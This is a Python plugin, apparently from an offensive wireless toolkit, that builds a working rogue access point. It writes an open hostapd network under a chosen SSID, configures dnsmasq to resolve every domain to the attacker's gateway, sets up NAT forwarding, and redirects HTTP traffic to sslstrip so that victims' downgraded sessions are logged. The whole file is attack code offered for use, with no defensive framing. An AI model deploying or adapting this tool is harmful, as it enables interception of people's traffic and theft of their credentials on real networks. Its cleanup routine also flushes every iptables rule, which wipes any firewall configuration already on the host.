# backend/plugins/rogue_ap.py
"""
Module: rogue_ap
Sets up a rogue access point with DNS hijacking and SSL stripping capabilities.
"""
import os
import subprocess
import logging
import shutil
import threading
import tempfile
from ..core.event_logger import log_event # Import for event logging

# Configure logging for this module
logger = logging.getLogger(__name__) # Inherits root logger configuration

class RogueAP:
    def __init__(self, iface: str, ssid: str, channel: int = 6, gateway_ip: str = '10.0.0.1', netmask: str = '255.255.255.0'):
        logger.info(f"Initializing RogueAP: iface={iface}, ssid={ssid}, channel={channel}, gateway={gateway_ip}")
        log_event("rogue_ap_init", {"interface": iface, "ssid": ssid, "channel": channel, "gateway_ip": gateway_ip})
        self.iface = iface
        self.ssid = ssid
        self.channel = channel
        self.gateway_ip = gateway_ip
        self.netmask = netmask
        self.hostapd_conf = None
        self.dnsmasq_conf = None
        self._tempdir = tempfile.mkdtemp(prefix="rogue_ap_")

    def generate_configs(self):
        # hostapd.conf
        self.hostapd_conf = os.path.join(self._tempdir, 'hostapd.conf')
        with open(self.hostapd_conf, 'w') as f:
            f.write(f"""
interface={self.iface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
auth_algs=1
wmm_enabled=0
macaddr_acl=0
""")
        logger.info(f"Generated hostapd.conf at {self.hostapd_conf}")

        # dnsmasq.conf
        self.dnsmasq_conf = os.path.join(self._tempdir, 'dnsmasq.conf')
        with open(self.dnsmasq_conf, 'w') as f:
            f.write(f"""
interface={self.iface}
dhcp-range={self.gateway_ip},static,12h
address=/#/{self.gateway_ip}
log-queries
log-dhcp
""")
        logger.info(f"Generated dnsmasq.conf at {self.dnsmasq_conf}")

    def enable_forwarding(self):
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True)
        logger.info("Enabled IP forwarding")

    def setup_iptables(self):
        # NAT rules
        subprocess.run(['iptables', '-t', 'nat', '-F'], check=True)
        subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'], check=True)
        subprocess.run(['iptables', '-A', 'FORWARD', '-i', self.iface, '-o', 'eth0', '-j', 'ACCEPT'], check=True)
        subprocess.run(['iptables', '-A', 'FORWARD', '-i', 'eth0', '-o', self.iface, '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'], check=True)
        logger.info("Configured iptables NAT and forwarding rules")

    def start_sslstrip(self, port: int = 8080):
        # sslstrip requires iptables redirect
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', str(port)], check=True)
        cmd = ['sslstrip', '-l', str(port), '-w', os.path.join(self._tempdir, 'sslstrip.log')]
        logger.info(f"Starting sslstrip: {' '.join(cmd)}")
        return subprocess.Popen(cmd)

    def start_services(self):
        self.generate_configs()
        self.enable_forwarding()
        self.setup_iptables()

        # Launch hostapd
        hostapd = subprocess.Popen(['hostapd', self.hostapd_conf])
        logger.info("hostapd launched")

        # Launch dnsmasq
        dnsmasq = subprocess.Popen(['dnsmasq', '-C', self.dnsmasq_conf])
        logger.info("dnsmasq launched")

        # Launch sslstrip
        sslstrip = self.start_sslstrip()
        logger.info("Rogue AP services started.")
        log_event("rogue_ap_started", {"interface": self.iface, "ssid": self.ssid, "channel": self.channel, "gateway_ip": self.gateway_ip, "status": "success"})
        return {'hostapd': hostapd, 'dnsmasq': dnsmasq, 'sslstrip': sslstrip}

    def cleanup(self):
        logger.info("Cleaning up Rogue AP services and rules...")
        log_event("rogue_ap_stopping", {"interface": self.iface, "ssid": self.ssid})
        # Store Popen objects in self.processes to terminate them properly
        # For now, using pkill as per original code.
        # TODO: Refactor to store Popen objects from start_services and terminate them directly.
        processes_to_kill = ['hostapd', 'dnsmasq', 'sslstrip']
        for proc_name in processes_to_kill:
            logger.info(f"Attempting to stop process: {proc_name} using pkill -f {proc_name}")
            try:
                # Using check=False to handle non-zero exit codes from pkill (e.g., if process not found)
                result = subprocess.run(['pkill', '-f', proc_name], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    logger.info(f"Successfully sent kill signal to processes matching {proc_name}. Output: {result.stdout.strip()}")
                else:
                    # pkill returns 1 if no processes matched, which is not necessarily an error in cleanup.
                    logger.warning(f"pkill -f {proc_name} exited with code {result.returncode}. stderr: {result.stderr.strip()}, stdout: {result.stdout.strip()}")
            except subprocess.TimeoutExpired:
                 logger.error(f"Timeout trying to pkill -f {proc_name}.", exc_info=True)
            except Exception as e: # Catch other errors like FileNotFoundError for pkill
                logger.error(f"Error trying to pkill -f {proc_name}: {e}", exc_info=True)

        if os.path.exists(self._tempdir):
            logger.info(f"Attempting to remove temporary directory: {self._tempdir}")
            try:
                shutil.rmtree(self._tempdir)
                logger.info(f"Successfully removed temp directory: {self._tempdir}")
            except Exception as e:
                logger.error(f"Error removing temp directory {self._tempdir}: {e}", exc_info=True)

        logger.info("Attempting to disable IP forwarding.")
        try:
            # Using check=False to log outcome manually
            result_fwd = subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], capture_output=True, text=True, timeout=5)
            if result_fwd.returncode == 0:
                logger.info(f"Successfully disabled IP forwarding. Output: {result_fwd.stdout.strip()}")
            else:
                logger.error(f"Failed to disable IP forwarding. RC: {result_fwd.returncode}. Stderr: {result_fwd.stderr.strip()}. Stdout: {result_fwd.stdout.strip()}")
        except subprocess.TimeoutExpired:
            logger.error("Timeout disabling IP forwarding.", exc_info=True)
        except Exception as e: # Catch other errors like FileNotFoundError
            logger.error(f"Error disabling IP forwarding: {e}", exc_info=True)

        logger.info("Attempting to flush iptables rules.")
        iptables_commands = [
            ['iptables', '-t', 'nat', '-F'],
            ['iptables', '-F']
        ]
        for cmd_args in iptables_commands:
            cmd_str = ' '.join(cmd_args)
            logger.info(f"Executing: {cmd_str}")
            try:
                result_ipt = subprocess.run(cmd_args, capture_output=True, text=True, timeout=5)
                if result_ipt.returncode == 0:
                    logger.info(f"Command '{cmd_str}' executed successfully.")
                else:
                    logger.error(f"Command '{cmd_str}' failed. RC: {result_ipt.returncode}. Stderr: {result_ipt.stderr.strip()}. Stdout: {result_ipt.stdout.strip()}")
            except subprocess.TimeoutExpired:
                logger.error(f"Timeout executing '{cmd_str}'.", exc_info=True)
            except Exception as e: # Catch other errors like FileNotFoundError
                logger.error(f"Error executing '{cmd_str}': {e}", exc_info=True)

        log_event("rogue_ap_stopped", {"interface": self.iface, "ssid": self.ssid, "status": "cleanup_attempted"})
        logger.info("Rogue AP cleanup finished.")
